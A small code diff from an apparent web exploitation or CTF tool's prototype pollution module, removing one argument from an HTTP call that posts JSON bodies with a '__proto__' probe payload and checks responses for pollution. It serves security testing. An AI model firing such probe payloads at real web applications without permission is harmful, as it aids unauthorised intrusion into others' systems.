@@ -14,7 +14,7 @@ class PrototypePollutionModule(ExploitModule):
                 ctx.logger(f"[payload {i}/{len(probes)}] Prototype Pollution: {payload}")
                 body=json.dumps({"__proto__":{"ctf_probe":"v3"},"payload":payload})
                 try:
-                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=body,use_curl=False,follow_redirects=False)
+                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=body,follow_redirects=False)
                     evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
                     low=r.text.lower()
                     if "ctf_probe" in low or "polluted" in low:
